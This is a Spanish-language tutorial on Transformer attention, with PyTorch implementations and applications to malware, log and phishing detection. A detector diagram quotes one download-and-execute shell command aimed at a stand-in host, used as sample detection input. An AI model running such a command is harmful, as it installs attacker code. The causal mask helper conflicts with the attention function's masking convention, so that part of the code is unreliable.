# Transformers y Mecanismo de Attention

## Introduccion

Los **Transformers** son arquitecturas neuronales que revolucionaron el procesamiento de secuencias al eliminar la recurrencia y usar exclusivamente **mecanismos de atencion**. Introducidos en el paper "Attention Is All You Need" (2017), son la base de modelos como BERT, GPT, y todos los LLMs modernos.

```
EVOLUCION DE ARQUITECTURAS PARA SECUENCIAS
==========================================

RNN (1980s)          LSTM/GRU (1997)         Transformer (2017)
    │                     │                        │
    ▼                     ▼                        ▼
┌───────────┐        ┌───────────┐           ┌───────────┐
│ Secuencial│        │ Secuencial│           │ Paralelo  │
│ Gradientes│        │ Gates para│           │ Attention │
│ vanishing │        │ memoria   │           │ global    │
└───────────┘        └───────────┘           └───────────┘

Limitaciones:         Mejora memoria          Sin recurrencia
- No paralelizable    pero sigue siendo:      - Totalmente paralelo
- Memoria corta       - Secuencial            - Memoria "infinita"
- Lento               - Lento en seq largas   - Muy eficiente
```

## Mecanismo de Attention

### Intuicion

```
ATTENTION: "DONDE MIRAR"
========================

Traduccion: "The cat sat on the mat"
            → "El gato se sento en la alfombra"

Al generar "gato", atencion alta en "cat":

The    cat    sat    on    the    mat
 │      │      │      │      │      │
0.05   0.80   0.02   0.01  0.02   0.10   ← pesos de atencion
 │      │      │      │      │      │
 └──────┴──────┴──────┴──────┴──────┘
                  │
                  ▼
               "gato"

La atencion permite al modelo "mirar" las partes
relevantes del input para generar cada output.
```

### Query, Key, Value

```
MECANISMO Q-K-V
===============

Analogia: Base de datos

Query (Q):  Lo que estas buscando     "Necesito informacion sobre gatos"
Key (K):    Indices de cada elemento  ["perro", "gato", "pajaro", ...]
Value (V):  Contenido de cada elemento[info_perro, info_gato, info_pajaro, ...]

Attention(Q, K, V):
1. Compara Query con cada Key (similitud)
2. Convierte similitudes en pesos (softmax)
3. Suma ponderada de Values

                    ┌───────────────────────────────┐
                    │        Attention Score        │
    Query ──────────┤                               │
                    │   score = Q · K^T / √d_k      │
                    │   weights = softmax(score)    │
    Keys ───────────┤   output = weights · V        │
                    │                               │
    Values ─────────┤                               │
                    └───────────────────────────────┘
                                   │
                                   ▼
                            Weighted Sum
```

### Formula Matematica

```
SCALED DOT-PRODUCT ATTENTION
============================

                    Q · K^T
Attention(Q,K,V) = softmax(─────────) · V
                     √d_k

Donde:
- Q: matriz de queries    [seq_len, d_k]
- K: matriz de keys       [seq_len, d_k]
- V: matriz de values     [seq_len, d_v]
- d_k: dimension de keys (para escalar)

El factor √d_k previene que los dot products
sean muy grandes (lo que haria softmax muy peaked).


Paso a paso:
────────────

1. Compute scores:       scores = Q · K^T           [seq, seq]
2. Scale:                scores = scores / √d_k     [seq, seq]
3. Softmax (por fila):   weights = softmax(scores)  [seq, seq]
4. Weighted sum:         output = weights · V       [seq, d_v]
```

---

## Self-Attention

### Concepto

```
SELF-ATTENTION
==============

En self-attention, Q, K, V vienen de LA MISMA secuencia.
Cada posicion "atiende" a todas las posiciones (incluida ella misma).

Input: "The cat sat"

        The    cat    sat
         │      │      │
         ▼      ▼      ▼
      ┌─────────────────────┐
      │   Linear (W_Q)      │──→ Q
      │   Linear (W_K)      │──→ K
      │   Linear (W_V)      │──→ V
      └─────────────────────┘
                │
                ▼
        ┌───────────────┐
        │  Attention    │
        │  Q · K^T · V  │
        └───────────────┘
                │
                ▼
        Output (contextualized)

Cada token ahora tiene informacion de TODOS los tokens.
"cat" sabe que esta cerca de "The" y "sat".
```

### Matriz de Atencion

```
MATRIZ DE ATENCION (ejemplo)
============================

Input: ["The", "cat", "sat", "on", "mat"]

Attention Matrix (despues de softmax):

           The   cat   sat   on   mat
        ┌─────────────────────────────┐
    The │ 0.3   0.2   0.1  0.1  0.3  │
    cat │ 0.2   0.4   0.2  0.1  0.1  │
    sat │ 0.1   0.3   0.3  0.2  0.1  │
    on  │ 0.1   0.1   0.2  0.4  0.2  │
    mat │ 0.2   0.1   0.1  0.2  0.4  │
        └─────────────────────────────┘

Cada fila suma 1.0 (softmax).
La fila i indica cuanto atiende posicion i a cada otra posicion.
```

---

## Multi-Head Attention

### Arquitectura

```
MULTI-HEAD ATTENTION
====================

Idea: Ejecutar multiples "heads" de atencion en paralelo,
      cada uno aprendiendo diferentes tipos de relaciones.

                     Input (X)
                        │
        ┌───────────────┼───────────────┐
        │               │               │
        ▼               ▼               ▼
   ┌─────────┐     ┌─────────┐     ┌─────────┐
   │ Head 1  │     │ Head 2  │     │ Head 3  │  ... (h heads)
   │         │     │         │     │         │
   │ W_Q^1   │     │ W_Q^2   │     │ W_Q^3   │
   │ W_K^1   │     │ W_K^2   │     │ W_K^3   │
   │ W_V^1   │     │ W_V^2   │     │ W_V^3   │
   └────┬────┘     └────┬────┘     └────┬────┘
        │               │               │
        ▼               ▼               ▼
   Attention_1     Attention_2     Attention_3
        │               │               │
        └───────────────┼───────────────┘
                        │
                   Concatenate
                        │
                        ▼
                   ┌─────────┐
                   │   W_O   │  (proyeccion final)
                   └─────────┘
                        │
                        ▼
                     Output

Head 1 puede aprender: relaciones sintacticas
Head 2 puede aprender: relaciones semanticas
Head 3 puede aprender: posiciones relativas
...
```

### Formula

```
MULTI-HEAD ATTENTION - FORMULA
==============================

MultiHead(Q, K, V) = Concat(head_1, ..., head_h) · W^O

donde:
    head_i = Attention(Q · W_i^Q, K · W_i^K, V · W_i^V)

Dimensiones tipicas (d_model = 512, h = 8):
- d_k = d_v = d_model / h = 64 por head
- W_i^Q, W_i^K: [512, 64]
- W_i^V: [512, 64]
- W^O: [512, 512]

Total parametros similar a single-head de dimension completa,
pero aprende multiples representaciones.
```

---

## Positional Encoding

### El Problema

```
TRANSFORMERS NO TIENEN NOCION DE ORDEN
======================================

Self-attention es permutation-equivariant:
Si permutas el input, el output se permuta igual.

"The cat sat" y "sat cat The" producen las mismas
representaciones (solo reordenadas).

PERO el orden importa!
- "Dog bites man" ≠ "Man bites dog"

Solucion: Anadir informacion de posicion EXPLICITAMENTE.
```

### Positional Encoding Sinusoidal

```
POSITIONAL ENCODING (original)
==============================

PE(pos, 2i)   = sin(pos / 10000^(2i/d_model))
PE(pos, 2i+1) = cos(pos / 10000^(2i/d_model))

Donde:
- pos: posicion en la secuencia (0, 1, 2, ...)
- i: dimension del embedding (0, 1, ..., d_model/2)
- d_model: dimension del modelo

Visualizacion (d_model=8):

pos │ dim 0   dim 1   dim 2   dim 3   dim 4   dim 5   ...
────┼───────────────────────────────────────────────────
 0  │  0.00   1.00    0.00    1.00    0.00    1.00
 1  │  0.84   0.54    0.10    0.99    0.01    1.00
 2  │  0.91  -0.42    0.20    0.98    0.02    1.00
 3  │  0.14  -0.99    0.30    0.95    0.03    1.00
... │  ...

Las diferentes frecuencias permiten al modelo aprender
tanto posiciones absolutas como relativas.
```

### Implementacion

```python
import torch
import torch.nn as nn
import math


class PositionalEncoding(nn.Module):
    """
    Positional encoding sinusoidal.
    """

    def __init__(
        self,
        d_model: int,
        max_len: int = 5000,
        dropout: float = 0.1
    ):
        super().__init__()

        self.dropout = nn.Dropout(p=dropout)

        # Crear matriz de positional encodings
        pe = torch.zeros(max_len, d_model)
        position = torch.arange(0, max_len, dtype=torch.float).unsqueeze(1)

        # Frecuencias: 10000^(2i/d_model)
        div_term = torch.exp(
            torch.arange(0, d_model, 2).float() * (-math.log(10000.0) / d_model)
        )

        pe[:, 0::2] = torch.sin(position * div_term)  # dimensiones pares
        pe[:, 1::2] = torch.cos(position * div_term)  # dimensiones impares

        pe = pe.unsqueeze(0)  # [1, max_len, d_model]
        self.register_buffer('pe', pe)

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        """
        Args:
            x: [batch, seq_len, d_model]
        Returns:
            x + positional encoding
        """
        x = x + self.pe[:, :x.size(1), :]
        return self.dropout(x)


class LearnablePositionalEncoding(nn.Module):
    """
    Positional encoding aprendido (usado en BERT, GPT).
    """

    def __init__(
        self,
        d_model: int,
        max_len: int = 512,
        dropout: float = 0.1
    ):
        super().__init__()

        self.dropout = nn.Dropout(p=dropout)
        self.pe = nn.Embedding(max_len, d_model)

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        seq_len = x.size(1)
        positions = torch.arange(seq_len, device=x.device)
        return self.dropout(x + self.pe(positions))
```

---

## Arquitectura Transformer Completa

### Diagrama

```
TRANSFORMER ARCHITECTURE
========================

                         ┌─────────────────────────────────────┐
                         │              DECODER                │
                         │    ┌─────────────────────────┐      │
                         │    │    Output Embedding     │      │
                         │    │    + Positional Enc     │      │
                         │    └───────────┬─────────────┘      │
                         │                │                    │
                         │    ┌───────────▼─────────────┐      │
                         │    │   Masked Multi-Head     │◄──┐  │
                         │    │      Self-Attention     │   │  │
                         │    └───────────┬─────────────┘   │  │
                         │                │ Add & Norm      │  │
                         │    ┌───────────▼─────────────┐   │  │
                         │    │     Multi-Head          │   │  │
┌────────────────────┐   │    │   Cross-Attention       │◄──┼──┼──┐
│      ENCODER       │   │    │   (Q from dec, K,V enc) │   │  │  │
│                    │   │    └───────────┬─────────────┘   │  │  │
│ ┌────────────────┐ │   │                │ Add & Norm      │  │  │
│ │Input Embedding │ │   │    ┌───────────▼─────────────┐   │  │  │
│ │+ Positional Enc│ │   │    │     Feed-Forward        │   │  │  │
│ └───────┬────────┘ │   │    │     (2 layers + ReLU)   │   │  │  │
│         │          │   │    └───────────┬─────────────┘   │  │  │
│ ┌───────▼────────┐ │   │                │ Add & Norm      │  │  │
│ │  Multi-Head    │ │   │                │                 │  │  │
│ │Self-Attention  │ │   │         (xN Decoder Layers)     │  │  │
│ └───────┬────────┘ │   │                │                 │  │  │
│         │Add & Norm│   │    ┌───────────▼─────────────┐   │  │  │
│ ┌───────▼────────┐ │   │    │      Linear             │   │  │  │
│ │  Feed-Forward  │ │   │    │      Softmax            │   │  │  │
│ │  (2048 hidden) │ │   │    └───────────┬─────────────┘   │  │  │
│ └───────┬────────┘ │   │                │                 │  │  │
│         │Add & Norm│   │           Output Probs           │  │  │
│         │          │   └─────────────────────────────────┘│  │  │
│  (xN Encoder Layers)                                         │  │
│         │          │                                         │  │
│         ▼          │                                         │  │
│   Encoder Output ──┼─────────────────────────────────────────┘  │
└────────────────────┘                                            │
                                                                  │
        (Output shifted right feeds back) ────────────────────────┘
```

### Componentes Clave

```
COMPONENTES DEL TRANSFORMER
===========================

1. EMBEDDINGS
   - Token Embedding: palabra → vector
   - Positional Encoding: posicion → vector
   - Suma: embedding = token_emb + pos_enc

2. MULTI-HEAD SELF-ATTENTION
   - Cada posicion atiende a todas las posiciones
   - Multiples heads para diferentes relaciones
   - En decoder: MASKED para no ver futuro

3. ADD & NORM (Residual + LayerNorm)
   - Skip connection: output = x + sublayer(x)
   - Layer normalization: estabiliza entrenamiento

4. FEED-FORWARD NETWORK
   - Dos capas lineales con ReLU
   - FFN(x) = ReLU(xW_1 + b_1)W_2 + b_2
   - Expansion: d_model → 4*d_model → d_model

5. CROSS-ATTENTION (solo decoder)
   - Query del decoder
   - Key, Value del encoder
   - Permite al decoder "mirar" el input
```

---

## Implementacion Transformer

### Attention y Multi-Head

```python
import torch
import torch.nn as nn
import torch.nn.functional as F
import math
from typing import Optional


class ScaledDotProductAttention(nn.Module):
    """Scaled Dot-Product Attention."""

    def __init__(self, dropout: float = 0.1):
        super().__init__()
        self.dropout = nn.Dropout(dropout)

    def forward(
        self,
        query: torch.Tensor,
        key: torch.Tensor,
        value: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> tuple[torch.Tensor, torch.Tensor]:
        """
        Args:
            query: [batch, heads, seq_q, d_k]
            key: [batch, heads, seq_k, d_k]
            value: [batch, heads, seq_k, d_v]
            mask: [batch, 1, seq_q, seq_k] or [batch, 1, 1, seq_k]

        Returns:
            output: [batch, heads, seq_q, d_v]
            attention_weights: [batch, heads, seq_q, seq_k]
        """
        d_k = query.size(-1)

        # Compute attention scores
        scores = torch.matmul(query, key.transpose(-2, -1)) / math.sqrt(d_k)

        # Apply mask (e.g., padding mask or causal mask)
        if mask is not None:
            scores = scores.masked_fill(mask == 0, float('-inf'))

        # Softmax and dropout
        attention_weights = F.softmax(scores, dim=-1)
        attention_weights = self.dropout(attention_weights)

        # Weighted sum of values
        output = torch.matmul(attention_weights, value)

        return output, attention_weights


class MultiHeadAttention(nn.Module):
    """Multi-Head Attention module."""

    def __init__(
        self,
        d_model: int,
        num_heads: int,
        dropout: float = 0.1
    ):
        super().__init__()

        assert d_model % num_heads == 0, "d_model must be divisible by num_heads"

        self.d_model = d_model
        self.num_heads = num_heads
        self.d_k = d_model // num_heads

        # Linear projections
        self.W_q = nn.Linear(d_model, d_model)
        self.W_k = nn.Linear(d_model, d_model)
        self.W_v = nn.Linear(d_model, d_model)
        self.W_o = nn.Linear(d_model, d_model)

        self.attention = ScaledDotProductAttention(dropout)

    def forward(
        self,
        query: torch.Tensor,
        key: torch.Tensor,
        value: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> tuple[torch.Tensor, torch.Tensor]:
        """
        Args:
            query: [batch, seq_q, d_model]
            key: [batch, seq_k, d_model]
            value: [batch, seq_k, d_model]
            mask: [batch, 1, seq_q, seq_k] or broadcastable

        Returns:
            output: [batch, seq_q, d_model]
            attention_weights: [batch, heads, seq_q, seq_k]
        """
        batch_size = query.size(0)

        # Linear projections and reshape for multi-head
        Q = self.W_q(query).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        K = self.W_k(key).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        V = self.W_v(value).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        # Shape: [batch, heads, seq, d_k]

        # Attention
        attn_output, attn_weights = self.attention(Q, K, V, mask)

        # Concatenate heads
        attn_output = attn_output.transpose(1, 2).contiguous().view(
            batch_size, -1, self.d_model
        )

        # Final projection
        output = self.W_o(attn_output)

        return output, attn_weights
```

### Transformer Encoder

```python
class PositionwiseFeedForward(nn.Module):
    """Feed-forward network in Transformer."""

    def __init__(
        self,
        d_model: int,
        d_ff: int,
        dropout: float = 0.1
    ):
        super().__init__()

        self.linear1 = nn.Linear(d_model, d_ff)
        self.linear2 = nn.Linear(d_ff, d_model)
        self.dropout = nn.Dropout(dropout)

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        return self.linear2(self.dropout(F.relu(self.linear1(x))))


class TransformerEncoderLayer(nn.Module):
    """Single encoder layer."""

    def __init__(
        self,
        d_model: int,
        num_heads: int,
        d_ff: int,
        dropout: float = 0.1
    ):
        super().__init__()

        self.self_attention = MultiHeadAttention(d_model, num_heads, dropout)
        self.feed_forward = PositionwiseFeedForward(d_model, d_ff, dropout)

        self.norm1 = nn.LayerNorm(d_model)
        self.norm2 = nn.LayerNorm(d_model)

        self.dropout = nn.Dropout(dropout)

    def forward(
        self,
        x: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        # Self-attention with residual
        attn_output, _ = self.self_attention(x, x, x, mask)
        x = self.norm1(x + self.dropout(attn_output))

        # Feed-forward with residual
        ff_output = self.feed_forward(x)
        x = self.norm2(x + self.dropout(ff_output))

        return x


class TransformerEncoder(nn.Module):
    """Stack of encoder layers."""

    def __init__(
        self,
        vocab_size: int,
        d_model: int = 512,
        num_heads: int = 8,
        num_layers: int = 6,
        d_ff: int = 2048,
        max_len: int = 512,
        dropout: float = 0.1
    ):
        super().__init__()

        self.d_model = d_model

        self.embedding = nn.Embedding(vocab_size, d_model)
        self.pos_encoding = PositionalEncoding(d_model, max_len, dropout)

        self.layers = nn.ModuleList([
            TransformerEncoderLayer(d_model, num_heads, d_ff, dropout)
            for _ in range(num_layers)
        ])

        self.norm = nn.LayerNorm(d_model)

    def forward(
        self,
        x: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        """
        Args:
            x: [batch, seq_len] token indices
            mask: [batch, 1, 1, seq_len] padding mask

        Returns:
            [batch, seq_len, d_model]
        """
        # Embedding + positional
        x = self.embedding(x) * math.sqrt(self.d_model)
        x = self.pos_encoding(x)

        # Encoder layers
        for layer in self.layers:
            x = layer(x, mask)

        return self.norm(x)
```

### Transformer Decoder

```python
class TransformerDecoderLayer(nn.Module):
    """Single decoder layer."""

    def __init__(
        self,
        d_model: int,
        num_heads: int,
        d_ff: int,
        dropout: float = 0.1
    ):
        super().__init__()

        # Masked self-attention
        self.self_attention = MultiHeadAttention(d_model, num_heads, dropout)

        # Cross-attention (to encoder output)
        self.cross_attention = MultiHeadAttention(d_model, num_heads, dropout)

        self.feed_forward = PositionwiseFeedForward(d_model, d_ff, dropout)

        self.norm1 = nn.LayerNorm(d_model)
        self.norm2 = nn.LayerNorm(d_model)
        self.norm3 = nn.LayerNorm(d_model)

        self.dropout = nn.Dropout(dropout)

    def forward(
        self,
        x: torch.Tensor,
        encoder_output: torch.Tensor,
        self_mask: Optional[torch.Tensor] = None,
        cross_mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        # Masked self-attention
        attn_output, _ = self.self_attention(x, x, x, self_mask)
        x = self.norm1(x + self.dropout(attn_output))

        # Cross-attention
        attn_output, _ = self.cross_attention(x, encoder_output, encoder_output, cross_mask)
        x = self.norm2(x + self.dropout(attn_output))

        # Feed-forward
        ff_output = self.feed_forward(x)
        x = self.norm3(x + self.dropout(ff_output))

        return x


def generate_causal_mask(seq_len: int) -> torch.Tensor:
    """
    Genera mascara causal para decoder.
    Previene atencion a posiciones futuras.

    Returns:
        [1, 1, seq_len, seq_len] mask
    """
    mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=1)
    mask = mask.masked_fill(mask == 1, float('-inf'))
    return mask.unsqueeze(0).unsqueeze(0)
```

### Transformer Completo

```python
class Transformer(nn.Module):
    """Complete Transformer for sequence-to-sequence tasks."""

    def __init__(
        self,
        src_vocab_size: int,
        tgt_vocab_size: int,
        d_model: int = 512,
        num_heads: int = 8,
        num_encoder_layers: int = 6,
        num_decoder_layers: int = 6,
        d_ff: int = 2048,
        max_len: int = 512,
        dropout: float = 0.1
    ):
        super().__init__()

        self.d_model = d_model

        # Embeddings
        self.src_embedding = nn.Embedding(src_vocab_size, d_model)
        self.tgt_embedding = nn.Embedding(tgt_vocab_size, d_model)
        self.pos_encoding = PositionalEncoding(d_model, max_len, dropout)

        # Encoder
        self.encoder_layers = nn.ModuleList([
            TransformerEncoderLayer(d_model, num_heads, d_ff, dropout)
            for _ in range(num_encoder_layers)
        ])

        # Decoder
        self.decoder_layers = nn.ModuleList([
            TransformerDecoderLayer(d_model, num_heads, d_ff, dropout)
            for _ in range(num_decoder_layers)
        ])

        self.encoder_norm = nn.LayerNorm(d_model)
        self.decoder_norm = nn.LayerNorm(d_model)

        # Output projection
        self.output_projection = nn.Linear(d_model, tgt_vocab_size)

    def encode(
        self,
        src: torch.Tensor,
        src_mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        x = self.src_embedding(src) * math.sqrt(self.d_model)
        x = self.pos_encoding(x)

        for layer in self.encoder_layers:
            x = layer(x, src_mask)

        return self.encoder_norm(x)

    def decode(
        self,
        tgt: torch.Tensor,
        encoder_output: torch.Tensor,
        tgt_mask: Optional[torch.Tensor] = None,
        memory_mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        x = self.tgt_embedding(tgt) * math.sqrt(self.d_model)
        x = self.pos_encoding(x)

        for layer in self.decoder_layers:
            x = layer(x, encoder_output, tgt_mask, memory_mask)

        return self.decoder_norm(x)

    def forward(
        self,
        src: torch.Tensor,
        tgt: torch.Tensor,
        src_mask: Optional[torch.Tensor] = None,
        tgt_mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        """
        Args:
            src: [batch, src_len] source tokens
            tgt: [batch, tgt_len] target tokens
            src_mask: padding mask for source
            tgt_mask: causal + padding mask for target

        Returns:
            [batch, tgt_len, tgt_vocab_size] logits
        """
        encoder_output = self.encode(src, src_mask)
        decoder_output = self.decode(tgt, encoder_output, tgt_mask, src_mask)
        return self.output_projection(decoder_output)
```

---

## Variantes de Transformers

### Encoder-Only (BERT)

```
BERT: Bidirectional Encoder Representations from Transformers
=============================================================

Arquitectura: Solo Encoder (sin decoder)
Entrenamiento: Masked Language Model + Next Sentence Prediction

          [CLS]  Token1  Token2  [MASK]  Token4  [SEP]
             │      │       │       │       │      │
             ▼      ▼       ▼       ▼       ▼      ▼
        ┌──────────────────────────────────────────────┐
        │              TRANSFORMER ENCODER             │
        │              (12/24 layers)                  │
        └──────────────────────────────────────────────┘
             │      │       │       │       │      │
             ▼      ▼       ▼       ▼       ▼      ▼
          h_cls   h_1     h_2    h_mask   h_4   h_sep
             │                     │
             ▼                     ▼
        Clasificacion      Predecir token
        (usa [CLS])        enmascarado

Usos:
- Clasificacion de texto
- NER (Named Entity Recognition)
- Question Answering
- Similarity/Embeddings
```

### Decoder-Only (GPT)

```
GPT: Generative Pre-trained Transformer
=======================================

Arquitectura: Solo Decoder con Masked Self-Attention
Entrenamiento: Next Token Prediction (Language Modeling)

        Token1  Token2  Token3  Token4
           │       │       │       │
           ▼       ▼       ▼       ▼
      ┌────────────────────────────────┐
      │      MASKED SELF-ATTENTION     │
      │   (solo puede ver el pasado)   │
      │                                │
      │   Token1 ve: Token1            │
      │   Token2 ve: Token1, Token2    │
      │   Token3 ve: Token1-3          │
      │   Token4 ve: Token1-4          │
      └────────────────────────────────┘
           │       │       │       │
           ▼       ▼       ▼       ▼
       Pred_2   Pred_3  Pred_4  Pred_5
       (Token2) (Token3)(Token4)(siguiente)

Generacion autoregresiva:
1. Input: "The cat"
2. Predice: "sat"
3. Input: "The cat sat"
4. Predice: "on"
5. ...
```

### Comparativa

| Aspecto | BERT (Encoder) | GPT (Decoder) | T5 (Enc-Dec) |
|---------|----------------|---------------|--------------|
| Attention | Bidireccional | Causal (izq) | Bid enc + Causal dec |
| Pretraining | MLM + NSP | Next token | Text-to-text |
| Generacion | No nativo | Si | Si |
| Clasificacion | Excelente | Con finetuning | Con finetuning |
| Tareas | Understanding | Generation | Ambas |

---

## Aplicaciones en Ciberseguridad

### 1. Clasificacion de Malware con BERT

```python
import torch
import torch.nn as nn
from transformers import BertModel, BertTokenizer


class MalwareBERT(nn.Module):
    """
    Clasificador de malware usando BERT.
    Input: Secuencias de API calls o strings del binario.
    """

    def __init__(
        self,
        num_classes: int = 10,
        pretrained: str = 'bert-base-uncased',
        freeze_bert: bool = False
    ):
        super().__init__()

        self.bert = BertModel.from_pretrained(pretrained)

        if freeze_bert:
            for param in self.bert.parameters():
                param.requires_grad = False

        self.classifier = nn.Sequential(
            nn.Linear(768, 256),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(256, num_classes)
        )

    def forward(
        self,
        input_ids: torch.Tensor,
        attention_mask: torch.Tensor
    ) -> torch.Tensor:
        """
        Args:
            input_ids: [batch, seq_len]
            attention_mask: [batch, seq_len]

        Returns:
            logits: [batch, num_classes]
        """
        outputs = self.bert(
            input_ids=input_ids,
            attention_mask=attention_mask
        )

        # Usar [CLS] token representation
        cls_output = outputs.last_hidden_state[:, 0, :]  # [batch, 768]

        return self.classifier(cls_output)


def preprocess_api_calls(api_calls: list[str], tokenizer) -> dict:
    """
    Preprocesa secuencias de API calls para BERT.

    Input: ["CreateFile", "WriteFile", "CloseHandle", ...]
    Output: tokens para BERT
    """
    # Concatenar API calls como texto
    text = " ".join(api_calls)

    return tokenizer(
        text,
        padding='max_length',
        truncation=True,
        max_length=512,
        return_tensors='pt'
    )
```

### 2. Analisis de Logs con Transformer

```python
class LogTransformer(nn.Module):
    """
    Transformer para analisis de secuencias de logs.
    Detecta anomalias y clasifica patrones de ataque.
    """

    def __init__(
        self,
        vocab_size: int = 10000,
        d_model: int = 256,
        num_heads: int = 4,
        num_layers: int = 4,
        num_classes: int = 5,
        max_len: int = 256,
        dropout: float = 0.1
    ):
        super().__init__()

        self.embedding = nn.Embedding(vocab_size, d_model)
        self.pos_encoding = PositionalEncoding(d_model, max_len, dropout)

        encoder_layer = nn.TransformerEncoderLayer(
            d_model=d_model,
            nhead=num_heads,
            dim_feedforward=d_model * 4,
            dropout=dropout,
            batch_first=True
        )

        self.transformer = nn.TransformerEncoder(
            encoder_layer,
            num_layers=num_layers
        )

        self.classifier = nn.Sequential(
            nn.Linear(d_model, d_model // 2),
            nn.ReLU(),
            nn.Dropout(dropout),
            nn.Linear(d_model // 2, num_classes)
        )

    def forward(
        self,
        x: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        """
        Args:
            x: [batch, seq_len] token indices
            mask: [batch, seq_len] padding mask (1=valid, 0=pad)

        Returns:
            logits: [batch, num_classes]
        """
        # Embedding + positional
        x = self.embedding(x) * math.sqrt(self.embedding.embedding_dim)
        x = self.pos_encoding(x)

        # Convertir mask para transformer
        if mask is not None:
            # src_key_padding_mask: True = ignore
            src_key_padding_mask = (mask == 0)
        else:
            src_key_padding_mask = None

        # Transformer
        x = self.transformer(x, src_key_padding_mask=src_key_padding_mask)

        # Mean pooling sobre secuencia
        if mask is not None:
            mask_expanded = mask.unsqueeze(-1).float()
            x = (x * mask_expanded).sum(dim=1) / mask_expanded.sum(dim=1)
        else:
            x = x.mean(dim=1)

        return self.classifier(x)


# Categorias de clasificacion:
# 0: Normal
# 1: Brute Force
# 2: SQL Injection
# 3: DDoS
# 4: Privilege Escalation
```

### 3. Deteccion de Phishing con Attention

```python
class PhishingDetector(nn.Module):
    """
    Detector de phishing usando Transformer.
    Analiza URLs y contenido de emails.
    """

    def __init__(
        self,
        vocab_size: int = 5000,
        d_model: int = 128,
        num_heads: int = 4,
        num_layers: int = 2,
        dropout: float = 0.1
    ):
        super().__init__()

        self.embedding = nn.Embedding(vocab_size, d_model, padding_idx=0)
        self.pos_encoding = PositionalEncoding(d_model, max_len=512, dropout=dropout)

        # Transformer encoder
        encoder_layer = nn.TransformerEncoderLayer(
            d_model=d_model,
            nhead=num_heads,
            dim_feedforward=d_model * 4,
            dropout=dropout,
            batch_first=True
        )
        self.transformer = nn.TransformerEncoder(encoder_layer, num_layers)

        # Attention pooling
        self.attention = nn.Linear(d_model, 1)

        # Classifier
        self.classifier = nn.Sequential(
            nn.Linear(d_model, 64),
            nn.ReLU(),
            nn.Dropout(dropout),
            nn.Linear(64, 2)  # phishing / legitimate
        )

    def attention_pool(
        self,
        x: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> torch.Tensor:
        """Attention-weighted pooling."""
        scores = self.attention(x).squeeze(-1)  # [batch, seq]

        if mask is not None:
            scores = scores.masked_fill(mask == 0, float('-inf'))

        weights = torch.softmax(scores, dim=1)  # [batch, seq]
        return torch.bmm(weights.unsqueeze(1), x).squeeze(1)  # [batch, d_model]

    def forward(
        self,
        x: torch.Tensor,
        mask: Optional[torch.Tensor] = None
    ) -> tuple[torch.Tensor, torch.Tensor]:
        """
        Returns:
            logits: [batch, 2]
            attention_weights: [batch, seq] para interpretabilidad
        """
        x = self.embedding(x)
        x = self.pos_encoding(x)

        if mask is not None:
            src_key_padding_mask = (mask == 0)
        else:
            src_key_padding_mask = None

        x = self.transformer(x, src_key_padding_mask=src_key_padding_mask)

        # Attention pooling con pesos para interpretabilidad
        scores = self.attention(x).squeeze(-1)
        if mask is not None:
            scores = scores.masked_fill(mask == 0, float('-inf'))
        attention_weights = torch.softmax(scores, dim=1)

        pooled = torch.bmm(attention_weights.unsqueeze(1), x).squeeze(1)

        return self.classifier(pooled), attention_weights


# Los attention weights revelan que partes del URL/email
# el modelo considera sospechosas
```

### 4. Embeddings de Comandos para Deteccion

```
PIPELINE CON TRANSFORMER EMBEDDINGS
===================================

Comandos Shell → Tokenizar → Transformer → Embeddings → Detector

    "wget http://evil.com && chmod +x mal && ./mal"
                        │
                        ▼
            ┌──────────────────┐
            │   Tokenizacion   │
            │   BPE/WordPiece  │
            └──────────────────┘
                        │
                        ▼
            ┌──────────────────┐
            │   Transformer    │
            │   Encoder        │
            └──────────────────┘
                        │
                        ▼
            [CLS] embedding (vector 256-dim)
                        │
                        ▼
            ┌──────────────────┐
            │   Clasificador   │
            │   (RF, SVM, NN)  │
            └──────────────────┘
                        │
                        ▼
            Benign: 0.05  |  Malicious: 0.95

Ventajas:
1. Captura contexto completo del comando
2. Atencion revela tokens sospechosos
3. Transfer learning desde modelos de codigo
4. Robusto a variaciones (ofuscacion simple)
```

---

## Hiperparametros Transformer

| Parametro | Valor Tipico | Notas |
|-----------|--------------|-------|
| d_model | 256-1024 | Dimension del modelo |
| num_heads | 4-16 | d_model debe ser divisible |
| num_layers | 2-12 | Mas layers = mas capacidad |
| d_ff | 4 * d_model | Dimension feed-forward |
| dropout | 0.1-0.3 | En attention y FFN |
| max_len | 512-2048 | Longitud maxima secuencia |
| warmup_steps | 4000 | Para learning rate schedule |

### Learning Rate Schedule

```python
class TransformerLRScheduler:
    """
    Learning rate schedule del paper original.
    lr = d_model^(-0.5) * min(step^(-0.5), step * warmup^(-1.5))
    """

    def __init__(
        self,
        optimizer,
        d_model: int,
        warmup_steps: int = 4000
    ):
        self.optimizer = optimizer
        self.d_model = d_model
        self.warmup_steps = warmup_steps
        self.step_num = 0

    def step(self):
        self.step_num += 1
        lr = self._get_lr()
        for param_group in self.optimizer.param_groups:
            param_group['lr'] = lr

    def _get_lr(self):
        return (
            self.d_model ** (-0.5) *
            min(
                self.step_num ** (-0.5),
                self.step_num * self.warmup_steps ** (-1.5)
            )
        )
```

---

## Limitaciones y Consideraciones

```
LIMITACIONES DE TRANSFORMERS
============================

1. COMPLEJIDAD CUADRATICA
   Attention: O(n²) en memoria y tiempo
   Secuencia de 4096 tokens = 16M operaciones por layer

   Soluciones:
   - Sparse attention (BigBird, Longformer)
   - Linear attention (Performer, Linear Transformer)
   - Flash Attention (optimizacion GPU)

